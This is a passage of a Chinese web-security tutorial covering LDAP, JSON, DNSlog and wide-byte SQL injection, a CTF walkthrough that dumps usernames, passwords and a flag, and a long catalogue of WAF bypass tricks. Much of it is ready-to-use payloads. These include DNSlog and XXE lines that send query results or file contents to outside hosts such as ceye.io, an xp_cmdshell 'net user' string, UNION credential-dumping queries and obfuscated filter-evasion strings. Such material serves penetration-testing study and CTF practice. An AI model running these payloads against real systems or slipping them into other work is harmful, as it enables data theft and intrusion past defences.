<p>假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">objectClass=printer</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">type=Epson*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>正确的过滤器为：</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">objectClass=printer</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">type=Epson*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>而当注入***)(objectClass=*))(&amp;(objectClass=void**时得到</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">objectClass=*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">objectClass=*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">objectClass=void</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">type=Epson*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>执行第一个，过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。<br> 这样我们就可以猜第二个括号的objectclass字段有些什么内容了。<br> LDAP盲注技术让攻击者使用基于TRUE/FALSE的技术访问所有的信息。</p> 
<p><strong>OR盲注</strong></p> 
<p>这种情况下，用于推测想要的信息的逻辑与AND是相反的，因为使用的是OR逻辑操作符。同样不予详述。</p> 
<p><strong>盲注深入</strong></p> 
<p>攻击者可以使用字母、数字搜索提取属性的值，这个想法的关键在于将一个复杂的值转化为TRUE/FALSE列表。这个机制，通常称为booleanization，大意是二值化吧，图十二概括了该机制，可用于不同的方式。<br> 假设攻击者想知道department属性的值，处理如下：</p> 
<pre><code class="prism language-scss">(&amp;(idprinter=HPLaserJet2100)(department=a*))(object=printer))
(&amp;(idprinter=HPLaserJet2100)(department=f*))(object=printer))
(&amp;(idprinter=HPLaserJet2100)(department=fa*))(object=printer))
</code></pre> 
<p>如此根据返回的不同结果猜解是否正确，和MYSQL盲注类似。<br> 同样，攻击者可以使用字符集削减技术减少获得信息所需的请求数，为完成这一点，他使用通配符测试给定的字符在值中是否为<em>anywhere</em>：</p> 
<pre><code class="prism language-scss">(&amp;(idprinter=HPLaserJet2100)(department=*b*))(object=printer))
(&amp;(idprinter=HPLaserJet2100)(department=*n*))(object=printer))
</code></pre> 
<p>这样子可以看department中是否有b和n，巧用可以加速猜解过程，当然一般肯定都是写脚本猜解</p> 
<p><strong>4.防御LDAP注入</strong></p> 
<p>​ 总而言之，我们看到圆括号、星号、逻辑操作符、关系运操作符在应用层都必须过滤。无论什么时候，只要可能，构造LDAP搜索过滤器的值在发送给LDAP服务器查询之前都要用应用层有效地值列表来核对。正则表达式替换掉就可以了。</p> 
<h4>
<a id="JSON_750"></a>④JSON注入</h4> 
<p><strong>1.简介</strong><br> JSON是一种轻量级的数据交换格式，易于阅读和编写，同时也易于机器解析和生成。它是基于JavaScript的一个子集，JSON采用完全独立于语言的文本格式，但是也使用类似于C语言家族的习惯（C、C#、C++、Java、JavaScript、Perl、Python等都可以使用JSON），这些特性使JSON成为理想的数据交换语言。<br> JSON可以将JavaScript中的对象转换为字符串，然后在函数、网络之间传递这个字符串。<br> <strong>2、JSON结构</strong><br> JSON建构于两种结构：<br> ①“名称/值”对的集合。不同的语言中，它被理解为对象（object），纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。<br> ②值的有序列表。在大部分语言中，它被理解为数组（array）。</p> 
<p>例如：下面一段示例使JSON最简单的Key-Value示例（名称-值对，键值对）：</p> 
<pre><code>{"Username":"xsser"}
{"Username":"xsser","Password":"12345","Email":"1234@st.com"}

当需要表示一组值的时候，JSON不但能够提供高可读性，而且可以减少复杂性。
例如表示一个管理员表，在JSON中，如下：
{"Users":[
	{"Username":"zhangsan","Password":"12345","Email":"12345@st.com"}
	{"Username":"lisi","Password":"123123","Email":"123123@st.com"}
	{"Username":"wangwu","Password":"321321","Email":"321321@st.com"}
]  }
</code></pre> 
<p><strong>3.JSON注入</strong><br> JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。<br> 在JSON中是根据引号（"）、冒号（:）、逗号（,）、花括号（{}）来区分各字符的意义的。如果向JSON中注入恶意字符，那么JSON将解析失败。<br> 例如：输入的Password值为：admin"1，那么在JSON语句中为：“password”：“admin"1”，为了"password"：“admin"1"成功解析，我们可以把"admin"1"转换为"admin"1”。<br> JSON注入和XML注入、SQL注入一样，都需要对影响语句的内容进行转义，如双引号、花括号等。</p> 
<p><strong>4.如何避免 JSON 注入</strong></p> 
<p>1、检查程序逻辑，根据实际需求对数据进行合理过滤和安全校验，以避免产生JSON注入。</p> 
<p>2、后台代码对Json数据进行编码</p> 
<p>JsonStringEncoder</p> 
<p>3、使用安全json parser防止json注入</p> 
<h4>
<a id="DNSlog_793"></a>⑤DNSlog注入</h4> 
<p><strong>1.什么是dnslog注入？</strong></p> 
<p>​ dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据</p> 
<p><strong>2.为什么要进行dnslog注入？</strong></p> 
<p>一般情况下，在我们无法通过联合查询直接获取数据的情况下，我们只能通过盲注，来一步步的获取数据，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池。。。</p> 
<p><strong>3.扩展</strong></p> 
<p>首先说明，dns带外查询属于MySQL注入，在MySQL中有个系统属性</p> 
<pre><code>secure_file_priv特性，有三种状态

secure_file_priv为null    表示不允许导入导出
secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹
secure_file_priv没有设置时，则表示没有任何限制
</code></pre> 
<p>可了解一下load_file和outfile</p> 
<pre><code>LOAD_FILE()函数

LOAD_FILE()函数读取一个文件并将其内容作为字符串返回

语法为：load_file(file_name)，其中file_name是文件的完整路径
</code></pre> 
<p>此函数使用需要满足的条件</p> 
<ul>
<li>文件必须位于服务器主机上</li>
<li>你必须具有该FILE权限才能读取该文件。拥有该FILE权限的用户可以读取服务器主机上的任何文件，该文件是world-readable的或MySQL服务器可读的，此属性与secure_file_priv状态相关</li>
<li>文件必须是所有人都可读的，并且它的大小小于max_allowed_packet字节</li>
</ul> 
<p><strong>UNC路径</strong></p> 
<p>什么是UNC路径？</p> 
<p>UNC路径就是类似softer这样的形式的网络路径。它符合 servernamesharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p> 
<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：servernamesharenamedirectoryfilename。</p> 
<p>例如把自己电脑的文件共享，你会获得如下路径，这就是UNC路径</p> 
<p>//iZ53sl3r1890u7Z/Users/Administrator/Desktop/111.txt</p> 
<p>这也就解释了为什么CONCAT()函数拼接了4个了，双斜杠表示网络资源路径多加两个就是转义了反斜杠。<br> 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p> 
<pre><code>1、当secure_file_priv为空，就可以读取磁盘的目录。
2、当secure_file_priv为G:，就可以读取G盘的文件。
3、当secure_file_priv为null，load_file就不能加载文件。
通过设置my.ini来配置。secure_file_priv=""就是可以load_flie任意磁盘的文件。
</code></pre> 
<pre><code>DNSLOG平台

http://www.dnslog.cn

http://admin.dnslog.link

http://ceye.io
</code></pre> 
<p><strong>4.注入实现</strong></p> 
<p><strong>1.sql注入</strong></p> 
<p>直接在mysql命令行执行：</p> 
<pre><code>select load_file('\\requests.xxxx.ceye.io\aa');
这是最基本的用法，来看看利用盲注来回显。
</code></pre> 
<pre><code>或者构造
payload：' and if((select load_file(concat('\\',(select database()),'.xxxx.ceye.io\abc'))),1,0)--+
</code></pre> 
<p>利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog</p> 
<p><strong>2.配合xss</strong></p> 
<p>XSS 盲打在安全测试的时候是比较常用的</p> 
<pre><code>payload: "&lt;script src=http://XSS.XXXXX.ceye.io&gt;&lt;/script&gt;"
</code></pre> 
<p><strong>3.配合SSRF</strong></p> 
<pre><code>payload: "... &lt;!ENTITY test SYSTEM "SSRF.xxxx.ceye.io\aa"&gt; ..."
</code></pre> 
<p><strong>4.配合xxe</strong></p> 
<p>当我们遇到XXE，如果这个XXE漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把dtd文件改成这样</p> 
<pre><code>&lt;!ENTITY % all
"&lt;!ENTITY &#x25; send SYSTEM 'http://XXXX.ceye.io/%file;'&gt;"
&gt;
%all;
</code></pre> 
<p><strong>5.配合命令执行</strong></p> 
<pre><code>payload: " ping %PATH%.pxxx.ceye.io ..."
</code></pre> 
<h4>
<a id="_912"></a>⑥宽字节注入</h4> 
<p><strong>1.简介</strong></p> 
<p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。</p> 
<p>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p> 
<p>两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。</p> 
<p>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p> 
<p>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</p> 
<p><strong>2.注入前提条件</strong></p> 
<p>要有宽字节注入漏洞</p> 
<p>1、首先要满足目标程序使用双/多字节字符集进行解析</p> 
<p>2、其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符。</p> 
<p><strong>宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象</strong></p> 
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1
</code></pre> 
<p>当提交</p> 
<pre><code>id=1' and 1=1%23
</code></pre> 
<p>时，MySQL的运行的SQL语句为</p> 
<pre><code>select * from user where  id ='1' and 1=1#'
</code></pre> 
<p>很明显这是没有注入成功的，而当我们提交</p> 
<pre><code>id=1%df' and 1=1%23
</code></pre> 
<p>MySQL的运行的SQL语句为</p> 
<pre><code>select * from user where id ='1運' and 1=1#'
</code></pre> 
<p>我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的也就是％5c中变成了一个汉字“运”，而“逃逸了出来。</p> 
<pre><code>%df' or 1=1# 直接遍历
</code></pre> 
<h2>
<a id="5_970"></a>5.注入思想</h2> 
<p>1、找到注入点：判断是否有漏洞，寻找插入位置</p> 
<p>2、构造注入语句，并在注入点注入形成新的SQL语句</p> 
<p>3、新形成的SQL语句提交数据库处理</p> 
<p>4、数据库执行新的SQL语句，引发注入攻击</p> 
<h2>
<a id="6_980"></a>6.实例</h2> 
<p><strong>1.BUUCTF : [SUCTF 2019]EasySQL 1</strong></p> 
<pre><code>1：select 1 from table    增加临时列，每行的列值是写在select后的数，这条sql语句中是1

2：select count(1) from table  管count(a)的a值如何变化，得出的值总是table表的行数

3：select sum(1) from table  计算临时列的和

直接构造payload  *,1
传入参数得到flag，即组成的查询语句为    select *,1||flag from Flag
</code></pre> 
<h4>
<a id="_2019LoveSQL___babysql_995"></a>实例：[极客大挑战 2019]LoveSQL babysql(有过滤)</h4> 
<p>如图，SQL注入</p> 
<h4>
<a id="_999"></a><strong>步骤一：</strong>
</h4> 
<p>（sql语句写在用户名框中如下）(如果写在URL中注意编码)</p> 
<pre><code>试一下万能密码注入：1' or 1=1#       很明显注入成功
</code></pre> 
<p><img src="https://images2.imgbox.com/c7/b7/K4srAIv3_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/77/cc/vEG2Rzdb_o.png" alt="在这里插入图片描述"></p> 
<h4>
<a id="_1013"></a><strong>步骤二：</strong>
</h4> 
<pre><code>查询字段数
admin' order by 3#(测试时，2,3,4,一个个试直到报错)
(注意:如果写在URL中注意编码问题)  (如: # 对应 %23)
</code></pre> 
<pre><code>这是admin' order by 4#
</code></pre> 
<p><img src="https://images2.imgbox.com/d4/50/rLADPkkW_o.png" alt="在这里插入图片描述"></p> 
<pre><code>由此可知共3个字段；
</code></pre> 
<h4>
<a id="_1031"></a><strong>步骤三：</strong>
</h4> 
<pre><code>用union查询测试注入点（回显点位）
</code></pre> 
<pre><code>1' union select 1,2,3 #
</code></pre> 
<p><img src="https://images2.imgbox.com/60/ef/F5H6iYns_o.png" alt="在这里插入图片描述"></p> 
<pre><code>可知注入点为2,3
</code></pre> 
<h4>
<a id="_1048"></a><strong>步骤四：</strong>
</h4> 
<pre><code>爆数据库，爆表
</code></pre> 
<pre><code>1' union select 1,database(),version()#      (爆数据库和数据库版本)
</code></pre> 
<p><img src="https://images2.imgbox.com/11/ff/7jjOdo9I_o.png" alt="在这里插入图片描述"></p> 
<pre><code>由此可知数据库为geek,  版本为10.3.18-MariaDB,   接下来爆表
</code></pre> 
<pre><code>1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#


1' uunionnion sselectelect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()#
</code></pre> 
<p><img src="https://images2.imgbox.com/2e/b4/Dm7eqNg1_o.png" alt="在这里插入图片描述"></p> 
<pre><code>得到表名geekuser,l0ve1ysq1,     接下来爆字段（列）
</code></pre> 
<pre><code>1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#

'b4bsql,geekuser

1' uunionnion sselectelect 1,2,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name='b4bsql'#
</code></pre> 
<p><img src="https://images2.imgbox.com/fa/ec/kpTiGuS6_o.png" alt="在这里插入图片描述"></p> 
<pre><code>可知有三个字段(列名) , 分别是 id, username ,password'  接下来就是爆数据
</code></pre> 
<pre><code>1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#

1' uunionnion sselectelect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql#
</code></pre> 
<p><img src="https://images2.imgbox.com/55/21/lyseu7Sc_o.png" alt="在这里插入图片描述"></p> 
<p>得到flag</p> 
<pre><code>flag{3db85812-e6b1-4b18-be8c-a9ad33ab7001}
</code></pre> 
<h2>
<a id="7_WAF_1111"></a>7. WAF简介</h2> 
<h4>
<a id="1WAF_1113"></a>1.WAF介绍</h4> 
<p>​ WAF（Web Application Firewall）的中文名称叫做“Web应用防火墙”，利用国际上公认的一种说法，WAF的定义是这样的：Web应用防火墙是通过执行一系列针对<a href="https://so.csdn.net/so/search?q=HTTP&amp;spm=1001.2101.3001.7020">HTTP</a>/HTTPS的安全策略来专门为Web应用提供保护的一款产品。通过从上面对WAF的定义中，我们可以很清晰的了解到，WAF是一种工作在应用层的、通过特定的安全策略来专门为Web应用提供安全防护的产品。</p> 
<h4>
<a id="2waf_1117"></a>2.waf分类</h4> 
<p>根据不同的分类方法，WAF可分为许多种。从产品形态上来划分，WAF主要分为以下三大类</p> 
<p><strong>1.硬件设备类</strong></p> 
<p>​ 目前安全市场上，大多数的WAF都属于此类。它们以一个独立的硬件设备的形态存在，支持以多种方式（如透明桥接模式、旁路模式、反向代理等）部署到网络中为后端的Web应用提供安全防护。相对于软件产品类的WAF，这类产品的优点是性能好、功能全面、支持多种模式部署等，但它的价格通常比较贵。国内的绿盟、安恒、启明星辰等厂商生产的WAF都属于此类。</p> 
<p><strong>2.软件产品类</strong></p> 
<p>​ 这种类型的WAF采用纯软件的方式实现，特点是安装简单，容易使用，成本低。但它的缺点也是显而易见的，因为它必须安装在Web应用服务器上，除了性能受到限制外，还可能会存在兼容性、安全等问题。这类WAF的代表有ModSecurity、Naxsi、网站安全狗等。</p> 
<p><strong>3.基于云的WAF</strong></p> 
<p>​ 随着云计算技术的快速发展，使得其于云的WAF实现成为可能。国内创新工场旗下的安全宝、360的网站宝是这类WAF的典型代表。它的优点是快速部署、零维护、成本低。对于中、小型的企业和个人站长是很有吸引力的。</p> 
<h4>
<a id="3WAF_1133"></a>3.WAF的常见特征</h4> 
<p>之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。</p> 
<p>总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能：</p> 
<ol>
<li> <p>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</p> </li>
<li> <p>访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</p> </li>
<li> <p>架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p> </li>
<li> <p>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p> </li>
</ol> 
<h4>
<a id="4WAF_1147"></a>4.WAF的常见特点：</h4> 
<p>异常检测协议：拒绝不符合HTTP标准的请求</p> 
<p>增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</p> 
<p>白名单&amp;黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题</p> 
<p>基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</p> 
<p>状态管理：重点进行会话保护</p> 
<p>另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</p> 
<p>如果是对于扫描器，WAF有其识别之道：</p> 
<p>扫描器识别主要由以下几点：</p> 
<ol>
<li> <p>扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识</p> </li>
<li> <p>单IP+ cookie某时间段内触发规则次数</p> </li>
<li> <p>隐藏的链接标签等()</p> </li>
<li> <p>Cookie植入</p> </li>
<li> <p>验证码验证，扫描器无法自动填充验证码</p> </li>
<li> <p>单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</p> </li>
</ol> 
<h2>
<a id="8WAF_1179"></a>8.绕过WAF的方法</h2> 
<h4>
<a id="1_1181"></a>1.大小写混合</h4> 
<p>​ 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术</p> 
<pre><code>举例：z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 
</code></pre> 
<p>示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理</p> 
<h4>
<a id="2_1191"></a>2.替换关键字</h4> 
<p>​ 这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过</p> 
<pre><code>举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4
</code></pre> 
<p>同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望</p> 
<h4>
<a id="3_1201"></a>3.使用编码</h4> 
<p><strong>1.URL编码</strong></p> 
<p>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29</p> 
<p>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：</p> 
<pre><code>page.php?id=1%252f%252a*/UNION%252f%252a /SELECT
</code></pre> 
<p><strong>2.十六进制编码</strong></p> 
<pre><code>举例：z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…

　　　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
</code></pre> 
<p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p> 
<p><strong>3.Unicode编码</strong></p> 
<p>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p> 
<p>看一下常用的几个符号的一些Unicode编码：</p> 
<pre><code>单引号:  %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7

空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0

左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8

右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9

举例：?id=10%D6‘%20AND%201=2%23　　

　　　SELECT 'Ä'='A'; #1
</code></pre> 
<p>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成’，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用</p> 
<p>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p> 
<p>另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下</p> 
<p>常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子</p> 
<h4>
<a id="4_1251"></a>4.使用注释</h4> 
<p>看一下常见的用于注释的符号有哪些：<em>//, – , /**/, #, --+,-- -, ;，–a</em></p> 
<p><strong>1.普通注释</strong></p> 
<pre><code>举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　　　

　　　'union%a0select pass from users#
</code></pre> 
<p>/**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询</p> 
<p><strong>2.内联注释</strong></p> 
<p>相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别</p> 
<pre><code>举例：index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3

　　　?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…
</code></pre> 
<p>两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p> 
<h4>
<a id="5_1277"></a>5.等价函数与命令</h4> 
<p>有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p> 
<p><strong>1.函数或变量</strong></p> 
<pre><code>hex()、bin() ==&gt; ascii()

sleep() ==&gt;benchmark()

concat_ws()==&gt;group_concat()

mid()、substr() ==&gt; substring()

@@user ==&gt; user()

@@datadir ==&gt; datadir()

举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　

或者：substr((select 'password'),1,1) = 0x70

　　　strcmp(left('password',1), 0x69) = 1

　　  strcmp(left('password',1), 0x70) = 0

　　　strcmp(left('password',1), 0x71) = -1
</code></pre> 
<p>上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等关键字被限制如何处理将在后面filter部分讨论</p> 
<p><strong>2.符号</strong></p> 
<p><strong>and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了</strong></p> 
<p>在看一下用得多的空格，可以使用如下符号表示其作用：</p> 
<pre><code>%20 %09 %0a %0b %0c %0d %a0 /**/
</code></pre> 
<p><strong>3.生僻函数</strong></p> 
<pre><code>MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　

?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))

SELECT xmlelement(name img,xmlattributes(1as src,'alx65rt(1)'as 117nx65rror));　//postgresql

?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
</code></pre> 
<p>MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制</p> 
<h4>
<a id="6_1333"></a>6.特殊符号</h4> 
<p>这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多</p> 
<p>先看下乌云drops上“waf的绕过技巧”一文使用的几个例子：</p> 
<pre><code>1.使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用

2.神奇的"-+."，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤

3.@符号，select@^1.from users; @用于变量定义如**@*****var_name***，一个@表示用户定义，@@表示系统变量

4.Mysql function() as xxx 也可不用as和空格　　 select-count(id)test from users;  //绕过空格限制
</code></pre> 
<p>可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到</p> 
<p>本人搜罗了部分可能发挥大作用的字符(未包括’、*、/等在内，考虑到前面已经出现较多次了)：</p> 
<pre><code>`、~、!、@、%、()、[]、.、-、+ 、|、%00
</code></pre> 
<p>举例：</p> 
<pre><code>关键字拆分：‘se’+’lec’+’t’

　　　　　　%S%E%L%E%C%T 1

　　　　　　1.aspx?id=1;EXEC(‘ma’+'ster..x’+'p_cm’+'dsh’+'ell ”net user”’)

!和()：' or --+2=- -!!!'2

 　　 id=1+(UnI)(oN)+(SeL)(EcT)　//另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔
</code></pre> 
<p>最后再给出一些和这些字符多少有点关系的操作符供参考：</p> 
<pre><code>&gt;&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN
</code></pre> 
<p>使用这些"特殊符号"实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段</p> 
<h4>
<a id="7_1379"></a>7.更改请求提交方式</h4> 
<p>GET POST COOKIE 等 POST-&gt;multipart/form-data</p> 
<h4>
<a id="8HTTP_1383"></a>8.HTTP参数控制(参数污染)</h4> 
<p>这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p> 
<pre><code>1.HPP(HTTP Parameter Polution)

举例：/?id=1;select+1,2,3+from+users+where+id=1—

　　　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—

　　　/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users
</code></pre> 
<p>又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式如下：</p> 
<pre><code>2.HPF(HTTP Parameter Fragment)

这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)

举例：　

　　/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--

　　select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—
</code></pre> 
<p>看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。</p> 
<pre><code>3.HPC(HTTP Parameter Contamination)

这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染

RFC2396定义了如下一些字符：

Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' ()
Reserved  : ; / ? : @ &amp; = + $ ,
Unwise    : { } |  ^ [ ] ` 
</code></pre> 
<p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑</p> 
<h4>
<a id="9_1427"></a>9.垃圾数据溢出</h4> 
<p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p> 
<pre><code>举例：
?id=1 and (select 1)=(Select  0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26

示例0xA*1000指0xA后面”A"重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出
</code></pre> 
<h4>
<a id="10_1438"></a>10.数据库特性绕过</h4> 
<p><strong>1.Mysql 技巧</strong></p> 
<pre><code>mysql 注释符有三种：#、/*...*/、-- ... (注意--后面有一个空格)
空格符:	[0x09,0x0a-0x0d,0x20,0xa0]
特殊符号：		%a 换行符
可结合注释符使用%23%0a， %2d%2d%0a。
内联注释：		/*!UnIon12345SelEcT*/ 1,user() //数字范围 1000-50540
mysql 黑魔法
select{x username}from {x11 test.admin};
</code></pre> 
<p><strong>2.SQL Server 技巧</strong></p> 
<pre><code>用来注释掉注射后查询的其余部分：
/* C 语言风格注释
-- SQL 注释
; 00％ 空字节
空白符：[0x01-0x20]
特殊符号：%3a 冒号     id=1 union:select 1,2 from:admin
函数变形：如 db_name[空白字符]()
</code></pre> 
<p><strong>3.Oracle 技巧</strong></p> 
<pre><code>注释符：--、/**/
空白字符：[0x00,0x09，0x0a-0x0d,0x20]
</code></pre> 
<h4>
<a id="11_FUZZ_1471"></a><strong>11.配合 FUZZ</strong>
</h4> 
